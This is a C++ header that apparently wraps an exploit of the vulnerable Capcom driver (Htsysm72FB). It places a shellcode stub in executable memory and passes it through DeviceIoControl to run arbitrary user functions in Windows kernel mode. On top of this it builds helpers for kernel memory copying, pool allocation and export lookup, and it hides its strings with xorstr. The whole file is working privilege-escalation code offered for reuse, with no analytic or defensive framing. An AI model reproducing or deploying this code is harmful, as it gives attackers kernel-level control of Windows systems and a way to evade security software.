#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winternl.h>
#include <functional>
#include <string>
#include "xorstr.hpp"
#include "ntdef.hpp"

namespace kcontrol
{
	typedef PVOID(NTAPI* MmGetSystemRoutineAddress)(PUNICODE_STRING);

	const static uint8_t code_template[] =
	{
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, user_function_ptr
		0xFF, 0xE0													// jmp rax
	};

	struct capcom_payload
	{
		void* ptr_to_code;
		uint8_t code[sizeof(code_template)];
	};

	namespace builder
	{
		static std::function<void(MmGetSystemRoutineAddress)> fnInUser;

		void capcom_fn_caller(MmGetSystemRoutineAddress fnMmGetSystemRoutineAddress) { fnInUser(fnMmGetSystemRoutineAddress); }

		void BuildPayload(std::function<void(MmGetSystemRoutineAddress)> userfn, capcom_payload* buffer)
		{
			fnInUser = userfn;

			memcpy(buffer->code, code_template, sizeof(code_template));
			buffer->ptr_to_code = buffer->code;
			*(void**)(buffer->code + 2) = capcom_fn_caller;
		}
	}

	static HANDLE hDevice = NULL;
	const static std::string device_name = xorstr("\\\\.\\Htsysm72FB");
	const static auto ioctl_x64 = 0xAA013044u;

	bool Init()
	{
		hDevice = CreateFileA(device_name.c_str(), GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		return hDevice && hDevice != INVALID_HANDLE_VALUE;
	}

	void Uninit()
	{
		CloseHandle(hDevice);
	}

	bool IoControl(std::function<void(MmGetSystemRoutineAddress)> userfn)
	{
		if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
			return false;

		capcom_payload *payload = (capcom_payload*)VirtualAlloc(NULL, sizeof(capcom_payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		auto r = false;

		if (payload)
		{
			builder::BuildPayload(userfn, payload);

			DWORD outBuffer = NULL; ULONG outbytes = NULL;

			r = DeviceIoControl(hDevice, ioctl_x64, &payload->ptr_to_code, sizeof(uintptr_t), &outBuffer, sizeof(DWORD), &outbytes, NULL);;

			VirtualFree(payload, 0, MEM_RELEASE);
		}

		return r;
	}

	PVOID kGetSystemRoutineAddress(LPCSTR SystemRoutineName)
	{
		ANSI_STRING asSystemRoutineName = { };
		RtlInitAnsiString(&asSystemRoutineName, SystemRoutineName);

		UNICODE_STRING usSystemRoutineName = { };
		RtlAnsiStringToUnicodeString(&usSystemRoutineName, &asSystemRoutineName, TRUE);

		PVOID result = NULL;

		IoControl([&usSystemRoutineName, &result](MmGetSystemRoutineAddress fnMmGetSystemRoutineAddress)
			{
				result = fnMmGetSystemRoutineAddress(&usSystemRoutineName);
			});

		RtlFreeUnicodeString(&usSystemRoutineName);

		return result;
	}

	PVOID kGetSystemRoutineAddress(LPCWSTR SystemRoutineName)
	{
		UNICODE_STRING usSystemRoutineName = { };
		RtlInitUnicodeString(&usSystemRoutineName, SystemRoutineName);

		PVOID result = NULL;

		IoControl([&usSystemRoutineName, &result](MmGetSystemRoutineAddress fnMmGetSystemRoutineAddress)
			{
				result = fnMmGetSystemRoutineAddress(&usSystemRoutineName);
			});

		return result;
	}

	void kCopyMemory(PVOID Destination, PVOID Source, SIZE_T Length)
	{
		typedef void* (*fnRtlCopyMemory)(void* _Dst, const void* _Src, size_t _MaxCount);
		fnRtlCopyMemory pRtlCopyMemory = (fnRtlCopyMemory)kGetSystemRoutineAddress(xorstr(L"RtlCopyMemory"));

		if (!pRtlCopyMemory)
			return;

		IoControl([&pRtlCopyMemory, &Destination, &Source, &Length](MmGetSystemRoutineAddress fnMmGetSystemRoutineAddress)
			{
				pRtlCopyMemory(Destination, Source, Length);
			});
	}

	PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T NumberOfBytes)
	{
		typedef PVOID(*fnExAllocatePool)(POOL_TYPE PoolType, SIZE_T NumberOfBytes);
		fnExAllocatePool pExAllocatePool = (fnExAllocatePool)kGetSystemRoutineAddress(xorstr(L"ExAllocatePool"));

		if (!pExAllocatePool)
			return NULL;

		PVOID result = NULL;

		IoControl([&pExAllocatePool, &result, &PoolType, &NumberOfBytes](MmGetSystemRoutineAddress fnMmGetSystemRoutineAddress)
			{
				result = pExAllocatePool(PoolType, NumberOfBytes);
			});

		return result;
	}

	uintptr_t kGetProcAddress(uintptr_t base, uint16_t ordinal)
	{
		uintptr_t address = { 0 };

		IoControl([&base, &ordinal, &address](auto mm_get)
			{
				const auto dos_header = (PIMAGE_DOS_HEADER)base;
				if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
					return;
				const auto nt_headers = (PIMAGE_NT_HEADERS64)(base + dos_header->e_lfanew);
				if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
					return;
				if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
					return;
				const auto export_ptr = (PIMAGE_EXPORT_DIRECTORY)(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + base);
				auto address_of_funcs = (PULONG)(export_ptr->AddressOfFunctions + base);
				for (ULONG i = 0; i < export_ptr->NumberOfFunctions; ++i)
				{
					if (export_ptr->Base + (uint16_t)i == ordinal) {
						address = address_of_funcs[i] + base;
						return;
					}
				}
			});

		return address;
	}

	uintptr_t kGetProcAddress(uintptr_t base, const char* name)
	{
		uintptr_t address = { 0 };

		typedef PVOID(*fnRtlFindExportedRoutineByName)(PVOID DllBase, PCHAR RoutineName);
		fnRtlFindExportedRoutineByName pRtlFindExportedRoutineByName = 
			(fnRtlFindExportedRoutineByName)kGetSystemRoutineAddress(xorstr(L"RtlFindExportedRoutineByName"));

		if (!pRtlFindExportedRoutineByName)
			return NULL;

		IoControl([&name, &base, &pRtlFindExportedRoutineByName, &address](auto mm_get)
			{
				address = (uintptr_t)pRtlFindExportedRoutineByName((void*)base, (char*)name);
			});

		return address;
	}
}